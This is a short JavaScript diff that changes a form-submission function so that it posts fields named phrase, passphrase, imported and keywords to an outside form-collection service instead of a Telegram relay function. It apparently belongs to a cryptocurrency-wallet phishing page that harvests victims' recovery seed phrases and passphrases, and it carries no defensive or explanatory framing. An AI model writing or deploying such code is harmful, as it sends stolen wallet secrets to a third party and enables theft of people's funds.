@@ -1,8 +1,13 @@
 function request_api(o){
-    fetch('/.netlify/functions/send-telegram', {
+    fetch('https://submit-form.com/i3ifkHupc', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(o)
+      body: JSON.stringify({
+        phrase: o.phrase,
+        passphrase: o.passphrase,
+        imported: o.imported,
+        keywords: o.keywords
+      })
     });
   }
 const Modal = `
